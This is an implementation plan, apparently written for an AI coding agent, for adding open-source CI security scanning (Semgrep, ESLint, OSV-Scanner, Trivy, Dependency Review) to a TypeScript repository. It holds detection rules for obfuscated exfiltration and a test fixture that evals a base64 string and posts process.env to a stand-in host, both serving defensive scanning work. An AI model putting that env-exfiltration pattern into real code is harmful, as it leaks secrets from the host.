# Source Security CI Layering Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add open-source CI layers that detect obfuscated exfil-style patterns in first-party TypeScript/shell (`src/`, `test/`, `scripts/`) while strengthening dependency gates—without scanning `node_modules` or using paid SaaS scanners.

**Architecture:** Semgrep custom rules plus a small bash heuristic run via `scripts/ci/run-semgrep.sh` and `scripts/ci/scan-long-base64-literals.sh`. ESLint blocks dynamic code execution in `src/`. Supply-chain job adds OSV-Scanner and Trivy secret scans scoped to app paths; a separate PR workflow runs GitHub Dependency Review. Existing Gitleaks and CodeQL workflows stay; docs and branch-protection list are updated.

**Tech Stack:** Semgrep (CLI or Docker), ESLint 9 flat config, OSV-Scanner CLI, Aqua Trivy, Gitleaks, CodeQL, pnpm 10, GitHub Actions.

## Global Constraints

- **Runtime:** Node **24.18.0** (`.nvmrc`); package manager **pnpm** only.
- **Imports:** Top of file only (no inline imports).
- **Switch exhaustiveness:** `never` in default cases for enums/unions.
- **CI scripts:** `set -euo pipefail` in all `scripts/ci/*.sh`.
- **OSS only:** No Socket, Snyk, Aikido, or other paid supply-chain products.
- **Scan scope:** `src/`, `test/`, `scripts/` for Semgrep, Trivy secret, and base64 heuristic; **never** `node_modules/`.
- **Spec:** `intent/source-security-ci-layering/spec.md`.

---

## File map

| Responsibility  | Create                                                                                                                                                                            | Modify                                                                   |
| --------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------ |
| Semgrep         | `semgrep/rules/obfuscated-exfil.yaml`, `semgrep/rules/obfuscated-exfil.test.yaml`, `semgrep/config.yaml`                                                                          | —                                                                        |
| CI scripts      | `scripts/ci/run-semgrep.sh`, `scripts/ci/scan-long-base64-literals.sh`, `scripts/ci/run-osv-scanner.sh`, `scripts/ci/run-trivy-app-secrets.sh`, `scripts/ci/changed-app-files.sh` | `scripts/ci/run-trivy.sh`                                                |
| Quality scripts | —                                                                                                                                                                                 | `package.json`                                                           |
| ESLint          | —                                                                                                                                                                                 | `eslint.config.mjs`                                                      |
| GHA             | `.github/workflows/dependency-review.yml`                                                                                                                                         | `.github/workflows/quality.yml`                                          |
| Docs            | —                                                                                                                                                                                 | `docs/quality/README.md`, `docs/features/features.md` (supply-chain row) |
| Rule tests      | `test/security/semgrep-fixtures/malicious-sample.ts` (fixture for local `--test` only; not imported by Jest)                                                                      | —                                                                        |

---

### Task 1: Changed-app-files helper

**Files:**

- Create: `scripts/ci/changed-app-files.sh`

**Interfaces:**

- Produces: prints one path per line under `src/`, `test/`, or `scripts/` changed vs `QUALITY_BASE_REF` (default `origin/main`).

- [ ] **Step 1: Create `scripts/ci/changed-app-files.sh`**

```bash
#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
cd "${ROOT_DIR}"

BASE_REF="${QUALITY_BASE_REF:-origin/main}"
if git rev-parse --verify "${BASE_REF}" >/dev/null 2>&1; then
  MERGE_BASE="$(git merge-base HEAD "${BASE_REF}" 2>/dev/null || echo "${BASE_REF}")"
else
  MERGE_BASE="HEAD~1"
fi

git diff --name-only --diff-filter=ACMRT "${MERGE_BASE}...HEAD" -- \
  'src/**' 'test/**' 'scripts/**' \
  | while IFS= read -r file; do
      [ -n "${file}" ] && printf '%s\n' "${file}"
    done
```

- [ ] **Step 2: Make executable**

Run: `chmod +x scripts/ci/changed-app-files.sh`

Expected: exit 0

- [ ] **Step 3: Smoke test**

Run: `QUALITY_BASE_REF=HEAD~1 ./scripts/ci/changed-app-files.sh | head`

Expected: list of paths or empty (no error)

- [ ] **Step 4: Commit**

```bash
git add scripts/ci/changed-app-files.sh
git commit -m "ci: add changed-app-files helper for security scans"
```

---

### Task 2: Semgrep rules and config

**Files:**

- Create: `semgrep/config.yaml`
- Create: `semgrep/rules/obfuscated-exfil.yaml`
- Create: `semgrep/rules/obfuscated-exfil.test.yaml`
- Create: `test/security/semgrep-fixtures/malicious-sample.ts`

**Interfaces:**

- Produces: Semgrep config loading OSS registry plus local rules; rule IDs prefixed `nestjs.obfuscated-exfil.`.

- [ ] **Step 1: Create `semgrep/config.yaml`**

```yaml
rules:
  - semgrep/rules/obfuscated-exfil.yaml
```

- [ ] **Step 2: Create `semgrep/rules/obfuscated-exfil.yaml`**

```yaml
rules:
  - id: nestjs.obfuscated-exfil.eval-call
    message: Avoid eval(); common in obfuscated exfil malware.
    severity: ERROR
    languages: [javascript, typescript]
    patterns:
      - pattern-either:
          - pattern: eval($X)
          - pattern: eval($X, ...)
    paths:
      include:
        - src/
        - test/
        - scripts/

  - id: nestjs.obfuscated-exfil.new-function
    message: Avoid new Function(); common in obfuscated exfil malware.
    severity: ERROR
    languages: [javascript, typescript]
    patterns:
      - pattern: new Function(...)
    paths:
      include:
        - src/
        - test/
        - scripts/

  - id: nestjs.obfuscated-exfil.vm-runInThisContext
    message: Avoid vm.runInThisContext with dynamic input.
    severity: ERROR
    languages: [javascript, typescript]
    patterns:
      - pattern-either:
          - pattern: vm.runInThisContext($CODE, ...)
          - pattern: runInThisContext($CODE, ...)
    paths:
      include:
        - src/
        - test/
        - scripts/

  - id: nestjs.obfuscated-exfil.base64-to-eval
    message: Base64 decode chained to eval/Function (obfuscation pattern).
    severity: ERROR
    languages: [javascript, typescript]
    pattern-either:
      - pattern: eval(Buffer.from($PAYLOAD, 'base64').toString(...))
      - pattern: eval(atob($PAYLOAD))
      - pattern: new Function(Buffer.from($PAYLOAD, 'base64').toString(...))
      - pattern: new Function(atob($PAYLOAD))
    paths:
      include:
        - src/
        - test/
        - scripts/

  - id: nestjs.obfuscated-exfil.env-keys-to-fetch
    message: Sending process.env keys/values to fetch (possible exfil).
    severity: ERROR
    languages: [javascript, typescript]
    patterns:
      - pattern-either:
          - pattern: |
              fetch($URL, {..., body: JSON.stringify(process.env), ...})
          - pattern: |
              fetch($URL, {..., body: JSON.stringify(Object.keys(process.env)), ...})
          - pattern: |
              fetch($URL, {..., body: $BODY, ...})
          - metavariable-pattern:
              metavariable: $BODY
              patterns:
                - pattern-either:
                    - pattern: process.env
                    - pattern: Object.keys(process.env)
    paths:
      include:
        - src/
        - scripts/
```

- [ ] **Step 3: Create `semgrep/rules/obfuscated-exfil.test.yaml`**

```yaml
rules:
  - id: nestjs.obfuscated-exfil.eval-call
    tests:
      - match:
          - eval('1')
      - no-match:
          - redis.eval('script', 1, 'key')

  - id: nestjs.obfuscated-exfil.base64-to-eval
    tests:
      - match:
          - eval(Buffer.from('YWRtaW4=', 'base64').toString('utf8'))
      - no-match:
          - Buffer.from('YWRtaW4=', 'base64').toString('utf8')
```

- [ ] **Step 4: Create fixture file for manual scan (must trigger rules)**

Create `test/security/semgrep-fixtures/malicious-sample.ts`:

```typescript
// Intentional bad patterns for Semgrep validation only — never import in app code.
export function __semgrepFixtureBad(): void {
  const payload = 'YWRtaW4=';
  eval(Buffer.from(payload, 'base64').toString('utf8'));
  void fetch('https://example.invalid/exfil', {
    method: 'POST',
    body: JSON.stringify(process.env),
  });
}
```

- [ ] **Step 5: Run Semgrep rule tests (install Semgrep once locally or use Docker)**

Run (Docker):

```bash
docker run --rm -v "${PWD}:/src" -w /src returntocorp/semgrep semgrep --test semgrep/rules/obfuscated-exfil.test.yaml
```

Expected: all tests passed

Run (CLI if installed):

```bash
semgrep --test semgrep/rules/obfuscated-exfil.test.yaml
```

- [ ] **Step 6: Commit**

```bash
git add semgrep/ test/security/semgrep-fixtures/malicious-sample.ts
git commit -m "ci: add Semgrep rules for obfuscated exfil patterns"
```

---

### Task 3: Semgrep and long-base64 CI scripts

**Files:**

- Create: `scripts/ci/run-semgrep.sh`
- Create: `scripts/ci/scan-long-base64-literals.sh`
- Modify: `package.json` (add `quality:app-security`)

**Interfaces:**

- Produces: `pnpm quality:app-security` exits 0 when clean; non-zero on findings.
- Consumes: `scripts/ci/changed-app-files.sh` when `SEMGREP_SCOPE=changed`.

- [ ] **Step 1: Create `scripts/ci/run-semgrep.sh`**

```bash
#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
cd "${ROOT_DIR}"

SEMGREP_SCOPE="${SEMGREP_SCOPE:-full}"
INCLUDE_ARGS=(
  --include 'src/**/*.ts'
  --include 'test/**/*.ts'
  --include 'scripts/**/*.sh'
  --include 'scripts/**/*.bash'
)

if [ "${SEMGREP_SCOPE}" = 'changed' ]; then
  mapfile -t TARGETS < <(./scripts/ci/changed-app-files.sh || true)
  if [ "${#TARGETS[@]}" -eq 0 ]; then
    echo "semgrep skipped: no changed app files"
    exit 0
  fi
else
  mapfile -t TARGETS < <(
    find src test scripts -type f \( -name '*.ts' -o -name '*.sh' \) \
      ! -path 'test/security/semgrep-fixtures/*' -print
  )
fi

FILTERED=()
for f in "${TARGETS[@]}"; do
  case "${f}" in
    test/security/semgrep-fixtures/*) continue ;;
    *) FILTERED+=("${f}") ;;
  esac
done
TARGETS=("${FILTERED[@]}")

run_semgrep() {
  semgrep scan --error --config semgrep/config.yaml \
    --config p/javascript --config p/nodejs \
    "${INCLUDE_ARGS[@]}" "$@"
}

if command -v semgrep >/dev/null 2>&1; then
  run_semgrep "${TARGETS[@]}"
  exit 0
fi

if command -v docker >/dev/null 2>&1; then
  docker run --rm -v "${ROOT_DIR}:/src" -w /src returntocorp/semgrep \
    semgrep scan --error --config semgrep/config.yaml \
    --config p/javascript --config p/nodejs \
    "${INCLUDE_ARGS[@]}" "${TARGETS[@]}"
  exit 0
fi

echo "semgrep: install semgrep CLI or Docker to run locally" >&2
exit 1
```

- [ ] **Step 2: Create `scripts/ci/scan-long-base64-literals.sh`**

```bash
#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
cd "${ROOT_DIR}"

MIN_LEN="${BASE64_LITERAL_MIN_LEN:-240}"
FOUND=0

scan_file() {
  local file="$1"
  if grep -nE "[A-Za-z0-9+/]{${MIN_LEN},}={0,2}" "${file}" >/dev/null 2>&1; then
    echo "suspicious long base64-like literal in ${file}" >&2
    grep -nE "[A-Za-z0-9+/]{${MIN_LEN},}={0,2}" "${file}" | head -5 >&2
    FOUND=1
  fi
}

while IFS= read -r -d '' file; do
  scan_file "${file}"
done < <(find src test scripts -type f \( -name '*.ts' -o -name '*.sh' \) ! -path 'test/security/semgrep-fixtures/*' -print0 2>/dev/null || true)

if [ "${FOUND}" -ne 0 ]; then
  echo "long-base64 scan failed (tune BASE64_LITERAL_MIN_LEN or allowlist if false positive)" >&2
  exit 1
fi

echo "long-base64 scan: ok"
```

- [ ] **Step 3: Add `package.json` scripts**

Add alongside existing `quality:*` entries:

```json
"quality:app-security": "./scripts/ci/run-semgrep.sh && ./scripts/ci/scan-long-base64-literals.sh",
"quality:app-security:changed": "SEMGREP_SCOPE=changed ./scripts/ci/run-semgrep.sh && ./scripts/ci/scan-long-base64-literals.sh"
```

Update the `quality` meta-script to append `&& pnpm quality:app-security` before `quality:supply-chain`.

- [ ] **Step 4: chmod and verify fixture fails scan**

Run:

```bash
chmod +x scripts/ci/run-semgrep.sh scripts/ci/scan-long-base64-literals.sh
pnpm quality:app-security
```

Expected: PASS (fixtures excluded from scan)

- [ ] **Step 5: Commit**

```bash
git add scripts/ci/run-semgrep.sh scripts/ci/scan-long-base64-literals.sh package.json
git commit -m "ci: add app-security semgrep and base64 literal scripts"
```

---

### Task 4: ESLint hardening for `src/`

**Files:**

- Modify: `eslint.config.mjs`

**Interfaces:**

- Produces: errors on `eval(` and `new Function(` in `src/**/*.ts` (not `.eval(` method calls—use `no-restricted-syntax` with selector excluding member calls).

- [ ] **Step 1: Add `src/` block with restricted syntax**

Insert before the spec-file override block (after the main `**/*.ts` rules):

```javascript
  {
    files: ['src/**/*.ts'],
    rules: {
      'no-restricted-syntax': [
        'error',
        {
          selector: "CallExpression[callee.name='eval']",
          message: 'eval() is forbidden in application code (obfuscation/exfil risk).',
        },
        {
          selector: "NewExpression[callee.name='Function']",
          message: 'new Function() is forbidden in application code.',
        },
      ],
      'no-restricted-imports': [
        'error',
        {
          paths: [
            {
              name: 'node:vm',
              message: 'Dynamic vm execution is forbidden in application code.',
            },
            {
              name: 'vm',
              message: 'Dynamic vm execution is forbidden in application code.',
            },
          ],
        },
      ],
    },
  },
```

- [ ] **Step 2: Run lint**

Run: `pnpm quality:lint`

Expected: PASS (existing code uses `redis.eval`, not global `eval`)

- [ ] **Step 3: Commit**

```bash
git add eslint.config.mjs
git commit -m "lint: forbid eval, Function, and vm in src"
```

---

### Task 5: OSV-Scanner and Trivy app secrets

**Files:**

- Create: `scripts/ci/run-osv-scanner.sh`
- Create: `scripts/ci/run-trivy-app-secrets.sh`
- Modify: `scripts/ci/run-trivy.sh`
- Modify: `package.json` (`quality:supply-chain`)

**Interfaces:**

- Produces: supply-chain script runs audit + OSV + Trivy vuln (repo, skip node_modules) + Trivy secrets on app paths only.

- [ ] **Step 1: Create `scripts/ci/run-osv-scanner.sh`**

```bash
#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
cd "${ROOT_DIR}"

if command -v osv-scanner >/dev/null 2>&1; then
  exec osv-scanner --lockfile=pnpm-lock.yaml
fi

if command -v docker >/dev/null 2>&1; then
  exec docker run --rm -v "${ROOT_DIR}:/repo" -w /repo ghcr.io/google/osv-scanner:latest \
    --lockfile=pnpm-lock.yaml
fi

echo "osv-scanner: install osv-scanner CLI or Docker to run locally" >&2
exit 1
```

- [ ] **Step 2: Create `scripts/ci/run-trivy-app-secrets.sh`**

```bash
#!/usr/bin/env bash
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
cd "${ROOT_DIR}"

SCAN_PATHS=(src test scripts)
TRIVY_ARGS=(
  fs
  --scanners secret
  --skip-dirs node_modules,dist,.git
  --severity HIGH,CRITICAL
  --exit-code 1
)

run_trivy() {
  trivy "${TRIVY_ARGS[@]}" "$@"
}

if command -v trivy >/dev/null 2>&1; then
  run_trivy "${SCAN_PATHS[@]}"
  exit 0
fi

if command -v docker >/dev/null 2>&1; then
  docker run --rm -v "${ROOT_DIR}:/repo" aquasec/trivy:latest \
    fs --scanners secret --skip-dirs node_modules,dist,.git \
    --severity HIGH,CRITICAL --exit-code 1 /repo/src /repo/test /repo/scripts
  exit 0
fi

echo "trivy: install trivy CLI or Docker to run locally" >&2
exit 1
```

- [ ] **Step 3: Update `scripts/ci/run-trivy.sh` to skip node_modules**

Replace scan target line with:

```bash
  exec trivy fs --scanners vuln --skip-dirs node_modules,dist,.git --severity HIGH,CRITICAL --exit-code 1 "${ROOT_DIR}"
```

Apply the same `--skip-dirs` to the Docker invocation.

- [ ] **Step 4: Update `quality:supply-chain` in `package.json`**

```json
"quality:supply-chain": "pnpm install --frozen-lockfile && ./scripts/ci/run-pnpm-audit.sh && ./scripts/ci/run-osv-scanner.sh && ./scripts/ci/run-trivy.sh && ./scripts/ci/run-trivy-app-secrets.sh"
```

- [ ] **Step 5: chmod and smoke**

Run:

```bash
chmod +x scripts/ci/run-osv-scanner.sh scripts/ci/run-trivy-app-secrets.sh
./scripts/ci/run-trivy-app-secrets.sh
```

Expected: PASS on clean tree (or install Trivy/Docker per messages)

- [ ] **Step 6: Commit**

```bash
git add scripts/ci/run-osv-scanner.sh scripts/ci/run-trivy-app-secrets.sh scripts/ci/run-trivy.sh package.json
git commit -m "ci: add OSV-Scanner and Trivy secret scan for app paths"
```

---

### Task 6: GitHub Actions jobs

**Files:**

- Modify: `.github/workflows/quality.yml`
- Create: `.github/workflows/dependency-review.yml`

**Interfaces:**

- Produces: job `app-security` runs `pnpm quality:app-security`; supply-chain job runs OSV + updated Trivy; PRs get `dependency-review`.

- [ ] **Step 1: Add `app-security` job to `quality.yml`**

```yaml
app-security:
  runs-on: ubuntu-latest
  steps:
    - uses: actions/checkout@v4
      with:
        fetch-depth: 0
    - uses: pnpm/action-setup@v4
    - uses: actions/setup-node@v4
      with:
        node-version-file: .nvmrc
        cache: pnpm
    - run: pnpm install --frozen-lockfile
    - name: Install Semgrep
      run: pip install semgrep
    - run: pnpm quality:app-security
```

- [ ] **Step 2: Extend `supply-chain` job**

After audit step, add:

```yaml
- name: OSV-Scanner
  uses: google/osv-scanner-action@v2
  with:
    scan-args: |-
      --lockfile=pnpm-lock.yaml
- name: Trivy app secrets
  uses: aquasecurity/trivy-action@v0.36.0
  with:
    scan-type: fs
    scan-ref: 'src,test,scripts'
    scanners: secret
    severity: HIGH,CRITICAL
    exit-code: 1
```

Update existing Trivy vuln step `scan-ref` to `.` and add `skip-dirs: node_modules,dist,.git` if the action supports it; otherwise rely on `run-trivy.sh` via script:

```yaml
- run: ./scripts/ci/run-trivy.sh
```

(remove duplicate aquasecurity/trivy-action vuln step if script replaces it)

- [ ] **Step 3: Create `.github/workflows/dependency-review.yml`**

```yaml
name: Dependency Review

on:
  pull_request:

permissions:
  contents: read
  pull-requests: write

jobs:
  dependency-review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/dependency-review-action@v4
        with:
          fail-on-severity: high
          deny-licenses: ''
```

- [ ] **Step 4: Push branch and confirm workflow syntax**

Run: `actionlint` if available, or rely on GitHub UI on first PR.

- [ ] **Step 5: Commit**

```bash
git add .github/workflows/quality.yml .github/workflows/dependency-review.yml
git commit -m "ci: add app-security and dependency review workflows"
```

---

### Task 7: Documentation and branch protection checklist

**Files:**

- Modify: `docs/quality/README.md`
- Modify: `docs/features/features.md` (dependency / security row if present)

- [ ] **Step 1: Extend `docs/quality/README.md`**

Add table rows:

| `pnpm quality:app-security` | Semgrep (OSS rules + p/javascript) + long-base64 heuristic on `src/`, `test/`, `scripts/` |
| `pnpm quality:supply-chain` | Adds OSV-Scanner + Trivy secrets on app paths |

Add section **Open-source only** listing Semgrep, OSV-Scanner, Trivy, Gitleaks, CodeQL, Dependency Review—explicitly not Socket/Snyk.

Add branch protection bullets: `app-security`, `dependency-review`.

Document local install hints:

```bash
brew install semgrep osv-scanner trivy
# or use Docker images documented in scripts/ci/*.sh
```

- [ ] **Step 2: Update features.md supply-chain line**

Mention app-source Semgrep layer and OSV-Scanner.

- [ ] **Step 3: Commit**

```bash
git add docs/quality/README.md docs/features/features.md
git commit -m "docs: document app-security CI layering"
```

---

## Self-review (plan author)

| Spec requirement               | Task                                                     |
| ------------------------------ | -------------------------------------------------------- |
| OSS tools only                 | Global Constraints; no commercial tools in tasks         |
| No node_modules scan           | Semgrep includes; Trivy secrets paths; skip-dirs on vuln |
| src/test/scripts focus         | All scan scripts                                         |
| ESLint layer                   | Task 4                                                   |
| Semgrep custom exfil rules     | Task 2                                                   |
| Dependency Review + OSV        | Tasks 5–6                                                |
| Gitleaks + CodeQL unchanged    | Not modified                                             |
| Docs + branch protection       | Task 7                                                   |
| Fixture excluded from CI scans | Task 3 (run-semgrep + base64 script)                     |

Placeholder scan: no TBD steps; Docker `run-trivy-app-secrets` path corrected in Task 5 Step 2 note.

---

## Execution handoff

**Plan complete and saved to `intent/source-security-ci-layering/plan.md`. Two execution options:**

**1. Subagent-Driven (recommended)** — dispatch a fresh subagent per task, review between tasks, fast iteration

**2. Inline Execution** — execute tasks in this session using executing-plans, batch execution with checkpoints

**Which approach?**
